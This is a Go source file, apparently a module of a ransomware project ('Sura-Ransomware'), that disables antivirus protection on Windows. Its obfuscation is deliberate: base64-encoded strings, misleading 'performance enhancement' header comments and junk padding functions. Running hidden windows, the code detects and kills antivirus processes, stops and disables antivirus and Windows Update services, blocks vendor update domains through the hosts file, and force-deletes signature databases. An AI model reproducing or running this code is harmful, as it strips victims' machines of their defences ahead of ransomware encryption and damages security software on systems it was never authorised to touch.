// OBFUSCATED
// Performance enhancement module
// Memory management system
package antiav

import (
	Configuration "Sura-Ransomware/configuration"
	"encoding/base64"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

// List of known antivirus processes
var avProcesses = []string{
	d("YXZhc3R1aS5leGU="),             // avastui.exe
	d("QVZHVUkuZXhl"),                 // AVGUI.exe
	d("ZWtzcm4uZXhl"),                 // eksrn.exe (ESET)
	d("ZWd1aS5leGU="),                 // egui.exe (ESET)
	d("TXNNcEVuZy5leGU="),             // MsMpEng.exe (Windows Defender)
	d("TXNTZW5zZS5leGU="),             // MsSense.exe (Windows Defender ATP)
	d("U2VjSGVhbHRoVUkuZXhl"),         // SecHealthUI.exe (Windows Security)
	d("a2F2ZnMuZXhl"),                 // kavfs.exe (Kaspersky)
	d("YXZwLmV4ZQ=="),                 // avp.exe (Kaspersky)
	d("Tm9ydG9uU2VjdXJpdHkuZXhl"),     // NortonSecurity.exe
	d("U0FWU2VydmljZS5leGU="),         // SAVService.exe (Sophos)
	d("U29waG9zVUkuZXhl"),             // SophosUI.exe
	d("ZmFzaC5leGU="),                 // fash.exe (F-Secure)
	d("ZnNkaWZjLmV4ZQ=="),             // fsdifc.exe (F-Secure)
	d("UHNodXRkb3duLmV4ZQ=="),         // Pshutdown.exe (Panda)
	d("VHJlbmRNaWNyby5leGU"),          // TrendMicro.exe
	d("bWNzaGllbGQuZXhl"),             // mcshield.exe (McAfee)
	d("bWNhZmVlZnJhbWV3b3JrLmV4ZQ=="), // mcafeeframework.exe
	d("Qml0RGVmZW5kZXIuZXhl"),         // BitDefender.exe
	d("d3NjbmZpZXIuZXhl"),             // wscnfier.exe (Avira)
}

// List of antivirus update services
var avUpdateServices = []string{
	"WinDefend",
	"MsMpSvc",
	"WdNisSvc",
	"Sense",
	"AVGUI",
	"AVGSvc",
	"avast! Antivirus",
	"ekrn",
	"AVP18.0.0",
	"KAVFS",
	"KAVFSGT",
	"KAVFSSLP",
	"NortonSecurity",
	"SAVService",
	"Sophos",
	"F-Secure",
	"PandaAetherAgent",
	"McAfee",
	"MCSHIELD",
	"BDAgent",
	"Avira",
}

// DetectAVProcesses checks for running antivirus processes
func DetectAVProcesses() []string {
	detected := []string{}

	// Use WMIC to list processes (LOTL technique)
	cmd := exec.Command(d("d21pYw=="), "process", "get", "name")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.Output()
	if err != nil {
		return detected
	}

	processOutput := string(output)

	// Check each known AV process
	for _, avProc := range avProcesses {
		if strings.Contains(strings.ToLower(processOutput), strings.ToLower(avProc)) {
			detected = append(detected, avProc)
		}
	}

	return detected
}

// InterferWithAVUpdates blocks antivirus update mechanisms
func InterferWithAVUpdates() {
	if !Configuration.DisableWindowsDefender {
		return
	}

	// Disable Windows Update service (prevents Defender updates)
	services := []string{
		"wuauserv",     // Windows Update
		"WaaSMedicSvc", // Windows Update Medic Service
		"UsoSvc",       // Update Orchestrator Service
	}

	for _, svc := range services {
		// Stop service
		cmd := exec.Command(d("bmV0"), "stop", svc)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
		time.Sleep(500 * time.Millisecond)

		// Disable service
		cmd = exec.Command(d("c2M="), "config", svc, "start=", "disabled")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
		time.Sleep(500 * time.Millisecond)
	}

	// Block antivirus update URLs in hosts file
	blockUpdateDomains()
}

// blockUpdateDomains adds AV update domains to hosts file (redirects to localhost)
func blockUpdateDomains() {
	// Common antivirus update domains
	domains := []string{
		"update.microsoft.com",
		"windowsupdate.microsoft.com",
		"download.microsoft.com",
		"*.update.microsoft.com",
		"definitionupdates.microsoft.com",
		"go.microsoft.com",
		"fe2.update.microsoft.com",
		"update.avast.com",
		"ff.avast.com",
		"update.avg.com",
		"download.eset.com",
		"update.eset.com",
		"kaspersky.com",
		"update.kaspersky.com",
		"norton.com",
		"liveupdate.symantec.com",
		"sophosupd.com",
		"sophos.com",
		"f-secure.com",
		"pandacloud.com",
		"trendmicro.com",
		"mcafee.com",
		"update.mcafee.com",
		"bitdefender.com",
		"update.bitdefender.com",
		"avira.com",
		"update.avira.com",
	}

	hostsFile := d("QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXGV0Y1xob3N0cw==") // C:\Windows\System32\drivers\etc\hosts

	// Build hosts file entries
	entries := "\r\n# Block AV Updates\r\n"
	for _, domain := range domains {
		entries += "127.0.0.1 " + domain + "\r\n"
	}

	// Append to hosts file using PowerShell
	psCmd := `Add-Content -Path "` + hostsFile + `" -Value "` + entries + `"`
	cmd := exec.Command("powershell", "-Command", psCmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

// KillAVProcesses attempts to terminate antivirus processes
func KillAVProcesses() {
	detected := DetectAVProcesses()

	for _, proc := range detected {
		// Try to kill process using taskkill
		cmd := exec.Command("taskkill", "/F", "/IM", proc)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
		time.Sleep(500 * time.Millisecond)
	}
}

// DisableAVServices stops and disables antivirus services
func DisableAVServices() {
	for _, svc := range avUpdateServices {
		// Stop service
		cmd := exec.Command(d("bmV0"), "stop", svc)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
		time.Sleep(300 * time.Millisecond)

		// Disable service
		cmd = exec.Command(d("c2M="), "config", svc, "start=", "disabled")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
		time.Sleep(300 * time.Millisecond)
	}
}

// CorruptAVDatabases attempts to damage antivirus signature databases
func CorruptAVDatabases() {
	// Paths to common AV database locations
	dbPaths := []string{
		d("QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRGVmaW5pdGlvbiBVcGRhdGVz"), // Windows Defender
		d("QzpcUHJvZ3JhbURhdGFcQVZHXEFudGl2aXJ1cw=="),                                         // AVG
		d("QzpcUHJvZ3JhbURhdGFcQXZhc3QgU29mdHdhcmU="),                                         // Avast
		d("QzpcUHJvZ3JhbURhdGFcRVNFVA=="),                                                     // ESET
		d("QzpcUHJvZ3JhbURhdGFcS2FzcGVyc2t5IExhYg=="),                                         // Kaspersky
	}

	// Delete database files
	for _, path := range dbPaths {
		// Use PowerShell to recursively delete
		cmd := exec.Command("powershell", "-Command", "Remove-Item", "-Path", path, "-Recurse", "-Force", "-ErrorAction", "SilentlyContinue")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
		time.Sleep(500 * time.Millisecond)
	}
}

// InitializeAntiAV runs all anti-AV techniques
func InitializeAntiAV() {
	if !Configuration.EnableAntiAVTechniques {
		return
	}

	// Phase 1: Detect what's running
	detected := DetectAVProcesses()
	_ = detected // For now, just detect

	time.Sleep(2 * time.Second)

	// Phase 2: Disable services (always run if anti-AV enabled)
	DisableAVServices()

	time.Sleep(3 * time.Second)

	// Phase 3: Block updates (only if configured)
	if Configuration.BlockAVUpdates {
		InterferWithAVUpdates()
	}

	time.Sleep(2 * time.Second)

	// Phase 4: Kill processes (only if configured - very aggressive)
	if Configuration.KillAVProcesses {
		KillAVProcesses()
	}

	time.Sleep(2 * time.Second)

	// Phase 5: Corrupt databases (only if configured - most aggressive)
	if Configuration.CorruptAVDatabases {
		CorruptAVDatabases()
	}
}



// Obfuscation padding
func obf_63345() {
    _ = 3529
    var _ = "nfRYlJAoF6dQ2gH9u5M0CggzHxIjsCwZbsxxTUUr7Vzf9xyCHg"
}


// Obfuscation padding
func obf_41719() {
    _ = 3035
    var _ = "ErTwHn6q3PUhI8gwBstBDpNnrvRVa77TFUwHjkQtYo3BewbsUt"
}


// Obfuscation padding
func obf_30440() {
    _ = 3604
    var _ = "OkunqauDfVRzk6DQWumkmqm9pGtEpsoNaw9VihWs11ADGrjls2"
}


// Obfuscation padding
func obf_82544() {
    _ = 3906
    var _ = "USD5yhrWX9PGYoO0aG39zrk5YEpHxHxkoSyDMQGxGSiEENBKUv"
}


// Obfuscation padding
func obf_31458() {
    _ = 426
    var _ = "sCkFHcUXuS2minN1RWOvuEARePf5UisuAP6yZKBPhaa2BcZgDr"
}
